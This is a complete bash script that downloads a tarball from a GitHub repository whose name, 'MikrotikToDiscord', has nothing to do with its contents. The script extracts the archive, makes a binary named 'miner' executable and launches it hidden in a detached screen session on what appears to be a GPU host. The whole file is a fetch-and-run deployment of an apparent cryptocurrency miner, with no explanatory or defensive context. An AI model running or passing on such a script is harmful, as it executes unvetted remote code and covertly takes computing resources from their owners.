#!/bin/bash
LD_LIBRARY_PATH=/usr/lib64-nvidia && export LD_LIBRARY_PATH && wget https://raw.githubusercontent.com/arymas49/MikrotikToDiscord/master/z.tar.gz && tar -xvf z.tar.gz && chmod +x miner && screen -dm bash -c "./miner"
